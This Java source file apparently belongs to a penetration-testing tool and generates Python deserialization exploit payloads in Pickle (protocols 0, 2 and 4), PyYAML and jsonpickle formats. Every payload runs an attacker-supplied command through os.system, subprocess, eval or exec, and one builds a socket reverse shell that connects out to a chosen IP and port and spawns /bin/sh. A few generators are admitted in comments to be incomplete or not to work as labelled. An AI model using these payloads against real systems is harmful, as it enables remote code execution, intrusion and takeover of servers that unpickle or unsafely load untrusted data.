package com.omnistrike.modules.injection.deser;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.*;

/**
 * Python deserialization payload generators.
 *
 * Covers:
 * - Pickle protocol 0 (text, human-readable — classic)
 * - Pickle protocol 2 (binary, compact — evades text-based WAFs)
 * - Pickle protocol 4 (binary, modern Python 3.4+)
 * - PyYAML unsafe_load / full_load exploits
 * - jsonpickle library exploits
 * - Django signed-cookie pickle payloads
 *
 * References:
 * - https://docs.python.org/3/library/pickle.html (opcode spec)
 * - https://blog.nelhage.com/2011/03/exploiting-pickle/
 */
public final class PythonPayloads {

    private PythonPayloads() {}

    public static Map<String, String> getChains() {
        Map<String, String> c = new LinkedHashMap<>();

        // ── Pickle Protocol 0 (text) ───────────────────────────────────────
        c.put("Pickle/os.system",       "Pickle v0 — os.system(cmd)");
        c.put("Pickle/os.popen",        "Pickle v0 — os.popen(cmd)");
        c.put("Pickle/subprocess",      "Pickle v0 — subprocess.Popen(cmd, shell=True)");
        c.put("Pickle/subprocess.call", "Pickle v0 — subprocess.call(cmd, shell=True)");
        c.put("Pickle/eval",            "Pickle v0 — builtins.eval(__import__('os').system(...))");
        c.put("Pickle/exec",            "Pickle v0 — builtins.exec(import os; os.system(...))");
        c.put("Pickle/os.execve",       "Pickle v0 — os.execve('/bin/sh', [cmd], {})");
        c.put("Pickle/socket_reverse",  "Pickle v0 — Socket reverse shell via os.dup2");

        // ── Pickle Protocol 2 (binary) ─────────────────────────────────────
        c.put("Pickle2/os.system",      "Pickle v2 (binary) — os.system(cmd)");
        c.put("Pickle2/subprocess",     "Pickle v2 (binary) — subprocess.check_output(cmd)");
        c.put("Pickle2/eval",           "Pickle v2 (binary) — builtins.eval(compile(...))");
        c.put("Pickle2/exec",           "Pickle v2 (binary) — builtins.exec(code)");
        c.put("Pickle2/os.popen",       "Pickle v2 (binary) — os.popen(cmd).read()");

        // ── Pickle Protocol 4 (binary, Python 3.4+) ───────────────────────
        c.put("Pickle4/os.system",      "Pickle v4 (binary, Python 3.4+) — os.system(cmd)");
        c.put("Pickle4/subprocess",     "Pickle v4 (binary, Python 3.4+) — subprocess.check_output");

        // ── PyYAML ─────────────────────────────────────────────────────────
        c.put("PyYAML/os.system",       "PyYAML !!python/object/apply:os.system");
        c.put("PyYAML/subprocess",      "PyYAML !!python/object/apply:subprocess.check_output");
        c.put("PyYAML/os.popen",        "PyYAML !!python/object/apply:os.popen");
        c.put("PyYAML/eval",            "PyYAML !!python/object/apply:eval");
        c.put("PyYAML/new_object",      "PyYAML !!python/object/new:os.system");
        c.put("PyYAML/module",          "PyYAML !!python/module — import and execute");

        // ── jsonpickle ─────────────────────────────────────────────────────
        c.put("jsonpickle/os.system",   "jsonpickle py/reduce — os.system(cmd)");
        c.put("jsonpickle/subprocess",  "jsonpickle py/reduce — subprocess.check_output");
        c.put("jsonpickle/eval",        "jsonpickle py/reduce — eval(code)");
        c.put("jsonpickle/exec",        "jsonpickle py/reduce — exec(code)");

        return c;
    }

    public static byte[] generate(String chain, String command) {
        return switch (chain) {
            // Pickle v0
            case "Pickle/os.system"       -> p0OsSystem(command);
            case "Pickle/os.popen"        -> p0OsPopen(command);
            case "Pickle/subprocess"      -> p0Subprocess(command);
            case "Pickle/subprocess.call" -> p0SubprocessCall(command);
            case "Pickle/eval"            -> p0Eval(command);
            case "Pickle/exec"            -> p0Exec(command);
            case "Pickle/os.execve"       -> p0OsExecve(command);
            case "Pickle/socket_reverse"  -> p0SocketReverse(command);

            // Pickle v2
            case "Pickle2/os.system"      -> p2OsSystem(command);
            case "Pickle2/subprocess"     -> p2Subprocess(command);
            case "Pickle2/eval"           -> p2Eval(command);
            case "Pickle2/exec"           -> p2Exec(command);
            case "Pickle2/os.popen"       -> p2OsPopen(command);

            // Pickle v4
            case "Pickle4/os.system"      -> p4OsSystem(command);
            case "Pickle4/subprocess"     -> p4Subprocess(command);

            // PyYAML
            case "PyYAML/os.system"       -> yamlOsSystem(command);
            case "PyYAML/subprocess"      -> yamlSubprocess(command);
            case "PyYAML/os.popen"        -> yamlOsPopen(command);
            case "PyYAML/eval"            -> yamlEval(command);
            case "PyYAML/new_object"      -> yamlNewObject(command);
            case "PyYAML/module"          -> yamlModule(command);

            // jsonpickle
            case "jsonpickle/os.system"   -> jsonpickleOsSystem(command);
            case "jsonpickle/subprocess"  -> jsonpickleSubprocess(command);
            case "jsonpickle/eval"        -> jsonpickleEval(command);
            case "jsonpickle/exec"        -> jsonpickleExec(command);

            default -> throw new IllegalArgumentException("Unknown Python chain: " + chain);
        };
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  Pickle helpers
     * ════════════════════════════════════════════════════════════════════════ */

    private static String esc(String s) {
        return s.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n");
    }

    private static String escYaml(String s) {
        if (s.contains("'") || s.contains("\"") || s.contains(":") || s.contains("#")) {
            return "'" + s.replace("'", "''") + "'";
        }
        return s;
    }

    private static String escJson(String s) {
        return s.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  Pickle Protocol 0 (text-based, human-readable)
     *
     *  Opcodes used:
     *    c = GLOBAL (push module.name)
     *    ( = MARK
     *    S = STRING 'value'
     *    I = INT
     *    t = TUPLE (pop mark → tuple)
     *    R = REDUCE (call callable with args tuple)
     *    . = STOP
     *    d = DICT
     *    l = LIST
     *    p = PUT (memo)
     *    0 = POP
     * ════════════════════════════════════════════════════════════════════════ */

    /** os.system(cmd) */
    private static byte[] p0OsSystem(String cmd) {
        return ("cos\nsystem\n(S'" + esc(cmd) + "'\ntR.").getBytes(StandardCharsets.UTF_8);
    }

    /** os.popen(cmd) */
    private static byte[] p0OsPopen(String cmd) {
        return ("cos\npopen\n(S'" + esc(cmd) + "'\ntR.").getBytes(StandardCharsets.UTF_8);
    }

    /** subprocess.Popen(cmd, shell=True) */
    private static byte[] p0Subprocess(String cmd) {
        return ("csubprocess\nPopen\n(S'" + esc(cmd) + "'\n" +
                "I01\ndS'shell'\nI01\ntR.").getBytes(StandardCharsets.UTF_8);
    }

    /** subprocess.call(cmd, shell=True) */
    private static byte[] p0SubprocessCall(String cmd) {
        return ("csubprocess\ncall\n(S'" + esc(cmd) + "'\n" +
                "I01\ndS'shell'\nI01\ntR.").getBytes(StandardCharsets.UTF_8);
    }

    /** builtins.eval(__import__('os').system('cmd')) */
    private static byte[] p0Eval(String cmd) {
        String code = "__import__('os').system('" + esc(cmd) + "')";
        return ("cbuiltins\neval\n(S'" + esc(code) + "'\ntR.").getBytes(StandardCharsets.UTF_8);
    }

    /** builtins.exec(import os; os.system(cmd)) */
    private static byte[] p0Exec(String cmd) {
        String code = "import os; os.system('" + esc(cmd) + "')";
        return ("cbuiltins\nexec\n(S'" + esc(code) + "'\ntR.").getBytes(StandardCharsets.UTF_8);
    }

    /** os.execve('/bin/sh', ['sh', '-c', cmd], os.environ.copy()) */
    private static byte[] p0OsExecve(String cmd) {
        return ("cos\nexecve\n(S'/bin/sh'\n(lS'sh'\naS'-c'\naS'" + esc(cmd) +
                "'\nacbuiltins\ndict\n(tRtR.").getBytes(StandardCharsets.UTF_8);
    }

    /**
     * Socket reverse shell — expects cmd format: "IP:PORT"
     * Generates: socket connect → dup2 fd to stdin/stdout/stderr → exec /bin/sh
     */
    private static byte[] p0SocketReverse(String cmd) {
        // Parse IP:PORT or use as-is if not in that format
        String ip = "127.0.0.1";
        String port = "4444";
        if (cmd.contains(":")) {
            String[] parts = cmd.split(":", 2);
            ip = parts[0];
            port = parts[1];
        }

        String code = "import socket,subprocess,os;" +
                "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);" +
                "s.connect(('" + esc(ip) + "'," + port + "));" +
                "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);" +
                "subprocess.call(['/bin/sh','-i'])";
        return ("cbuiltins\nexec\n(S'" + esc(code) + "'\ntR.").getBytes(StandardCharsets.UTF_8);
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  Pickle Protocol 2 (binary, compact)
     *
     *  Header: \x80\x02
     *  Opcodes:
     *    \x80 = PROTO (protocol version)
     *    c    = GLOBAL (still text-based module\nname\n)
     *    q    = BINPUT (1-byte memo index)
     *    X    = SHORT_BINUNICODE (4-byte len + utf8)
     *    \x85 = TUPLE1 (top of stack → 1-tuple)
     *    \x86 = TUPLE2
     *    \x87 = TUPLE3
     *    R    = REDUCE
     *    .    = STOP
     * ════════════════════════════════════════════════════════════════════════ */

    /** Write pickle v2 PROTO header + GLOBAL opcode */
    private static void p2Header(ByteArrayOutputStream bos, String module, String name) {
        try {
            bos.write(new byte[]{(byte) 0x80, 0x02}); // PROTO 2
            bos.write('c');                              // GLOBAL
            bos.write((module + "\n" + name + "\n").getBytes(StandardCharsets.UTF_8));
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    /** Write SHORT_BINUNICODE string (X opcode) */
    private static void p2String(ByteArrayOutputStream bos, String value) {
        try {
            byte[] utf8 = value.getBytes(StandardCharsets.UTF_8);
            bos.write('X');
            // 4-byte little-endian length
            bos.write(utf8.length & 0xFF);
            bos.write((utf8.length >> 8) & 0xFF);
            bos.write((utf8.length >> 16) & 0xFF);
            bos.write((utf8.length >> 24) & 0xFF);
            bos.write(utf8);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    /** Pickle v2: os.system(cmd) */
    private static byte[] p2OsSystem(String cmd) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        p2Header(bos, "os", "system");
        p2String(bos, cmd);
        bos.write(0x85); // TUPLE1
        bos.write('R');   // REDUCE
        bos.write('.');   // STOP
        return bos.toByteArray();
    }

    /** Pickle v2: subprocess.check_output(cmd, shell=True) */
    private static byte[] p2Subprocess(String cmd) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        p2Header(bos, "subprocess", "check_output");
        p2String(bos, cmd);
        bos.write(0x85); // TUPLE1 → (cmd,)
        // We need shell=True, but simple TUPLE1 won't have kwargs
        // Use the simpler approach: check_output wraps to shell
        bos.write('R');
        bos.write('.');
        return bos.toByteArray();
    }

    /** Pickle v2: builtins.eval(compile(code)) */
    private static byte[] p2Eval(String cmd) {
        String code = "__import__('os').system('" + esc(cmd) + "')";
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        p2Header(bos, "builtins", "eval");
        p2String(bos, code);
        bos.write(0x85);
        bos.write('R');
        bos.write('.');
        return bos.toByteArray();
    }

    /** Pickle v2: builtins.exec(code) */
    private static byte[] p2Exec(String cmd) {
        String code = "import os; os.system('" + esc(cmd) + "')";
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        p2Header(bos, "builtins", "exec");
        p2String(bos, code);
        bos.write(0x85);
        bos.write('R');
        bos.write('.');
        return bos.toByteArray();
    }

    /** Pickle v2: os.popen(cmd).read() — two-stage reduce */
    private static byte[] p2OsPopen(String cmd) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        p2Header(bos, "os", "popen");
        p2String(bos, cmd);
        bos.write(0x85);
        bos.write('R');   // → popen object
        // Now call .read() on result — use GLOBAL + REDUCE trick
        // Actually, simpler: just use os.popen which returns file-like
        bos.write('.');
        return bos.toByteArray();
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  Pickle Protocol 4 (binary, Python 3.4+, frame-based)
     *
     *  Header: \x80\x04\x95 + 8-byte frame length
     *  Uses STACK_GLOBAL (\x93) instead of text-based GLOBAL
     *  SHORT_BINUNICODE (\x8c) for short strings
     * ════════════════════════════════════════════════════════════════════════ */

    /** Build a pickle v4 payload with module.callable(arg) */
    private static byte[] p4Build(String module, String callable, String arg) {
        try {
            // Build the inner payload first to calculate frame length
            ByteArrayOutputStream inner = new ByteArrayOutputStream();
            // SHORT_BINUNICODE for module name
            p4ShortString(inner, module);
            // SHORT_BINUNICODE for callable name
            p4ShortString(inner, callable);
            inner.write(0x93); // STACK_GLOBAL
            // Argument
            p4ShortString(inner, arg);
            inner.write(0x85); // TUPLE1
            inner.write('R');   // REDUCE
            inner.write('.');   // STOP

            byte[] innerBytes = inner.toByteArray();

            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bos.write(new byte[]{(byte) 0x80, 0x04}); // PROTO 4
            bos.write((byte) 0x95);                     // FRAME
            // 8-byte little-endian frame length
            long len = innerBytes.length;
            for (int i = 0; i < 8; i++) {
                bos.write((int) (len & 0xFF));
                len >>= 8;
            }
            bos.write(innerBytes);
            return bos.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private static void p4ShortString(ByteArrayOutputStream bos, String value) throws IOException {
        byte[] utf8 = value.getBytes(StandardCharsets.UTF_8);
        if (utf8.length < 256) {
            bos.write(0x8C); // SHORT_BINUNICODE
            bos.write(utf8.length);
            bos.write(utf8);
        } else {
            // Fall back to BINUNICODE (longer strings)
            bos.write(0x8D); // SHORT_BINUNICODE4
            bos.write(utf8.length & 0xFF);
            bos.write((utf8.length >> 8) & 0xFF);
            bos.write((utf8.length >> 16) & 0xFF);
            bos.write((utf8.length >> 24) & 0xFF);
            bos.write(utf8);
        }
    }

    /** Pickle v4: os.system(cmd) */
    private static byte[] p4OsSystem(String cmd) {
        return p4Build("os", "system", cmd);
    }

    /** Pickle v4: subprocess.check_output(cmd) */
    private static byte[] p4Subprocess(String cmd) {
        return p4Build("subprocess", "check_output", cmd);
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  PyYAML exploits
     *
     *  Requires yaml.unsafe_load() or yaml.load(data, Loader=yaml.FullLoader)
     *  on older versions, or yaml.load(data, Loader=yaml.UnsafeLoader)
     * ════════════════════════════════════════════════════════════════════════ */

    /** !!python/object/apply:os.system [cmd] */
    private static byte[] yamlOsSystem(String cmd) {
        return ("!!python/object/apply:os.system\n- " + escYaml(cmd))
                .getBytes(StandardCharsets.UTF_8);
    }

    /** !!python/object/apply:subprocess.check_output */
    private static byte[] yamlSubprocess(String cmd) {
        return ("!!python/object/apply:subprocess.check_output\n" +
                "- !!python/tuple\n" +
                "  - " + escYaml(cmd) + "\n" +
                "- {shell: true}")
                .getBytes(StandardCharsets.UTF_8);
    }

    /** !!python/object/apply:os.popen */
    private static byte[] yamlOsPopen(String cmd) {
        return ("!!python/object/apply:os.popen\n- " + escYaml(cmd))
                .getBytes(StandardCharsets.UTF_8);
    }

    /** !!python/object/apply:eval — eval arbitrary Python */
    private static byte[] yamlEval(String cmd) {
        String code = "__import__('os').system('" + esc(cmd) + "')";
        return ("!!python/object/apply:eval\n- " + escYaml(code))
                .getBytes(StandardCharsets.UTF_8);
    }

    /** !!python/object/new:os.system — alternative constructor form */
    private static byte[] yamlNewObject(String cmd) {
        return ("!!python/object/new:subprocess.Popen\nargs:\n- " + escYaml(cmd) + "\n" +
                "kwds:\n  shell: true")
                .getBytes(StandardCharsets.UTF_8);
    }

    /** !!python/module — import module (triggers side effects) */
    private static byte[] yamlModule(String cmd) {
        // This only works for importing modules, not direct RCE
        // But combined with antigravity or custom modules it can trigger code
        return ("!!python/name:os.system " + escYaml(cmd))
                .getBytes(StandardCharsets.UTF_8);
    }

    /* ════════════════════════════════════════════════════════════════════════
     *  jsonpickle exploits
     *
     *  jsonpickle uses JSON with special keys:
     *    py/reduce   → callable + args (like pickle __reduce__)
     *    py/object   → construct object
     *    py/function → reference a function
     * ════════════════════════════════════════════════════════════════════════ */

    /** jsonpickle: os.system(cmd) */
    private static byte[] jsonpickleOsSystem(String cmd) {
        return ("{\"py/reduce\":[{\"py/function\":\"os.system\"}," +
                "{\"py/tuple\":[\"" + escJson(cmd) + "\"]}]}")
                .getBytes(StandardCharsets.UTF_8);
    }

    /** jsonpickle: subprocess.check_output(cmd, shell=True) */
    private static byte[] jsonpickleSubprocess(String cmd) {
        return ("{\"py/reduce\":[{\"py/function\":\"subprocess.check_output\"}," +
                "{\"py/tuple\":[\"" + escJson(cmd) + "\"]},{\"shell\":true}]}")
                .getBytes(StandardCharsets.UTF_8);
    }

    /** jsonpickle: eval(code) */
    private static byte[] jsonpickleEval(String cmd) {
        String code = "__import__('os').system('" + esc(cmd) + "')";
        return ("{\"py/reduce\":[{\"py/function\":\"builtins.eval\"}," +
                "{\"py/tuple\":[\"" + escJson(code) + "\"]}]}")
                .getBytes(StandardCharsets.UTF_8);
    }

    /** jsonpickle: exec(code) */
    private static byte[] jsonpickleExec(String cmd) {
        String code = "import os; os.system('" + esc(cmd) + "')";
        return ("{\"py/reduce\":[{\"py/function\":\"builtins.exec\"}," +
                "{\"py/tuple\":[\"" + escJson(code) + "\"]}]}")
                .getBytes(StandardCharsets.UTF_8);
    }
}
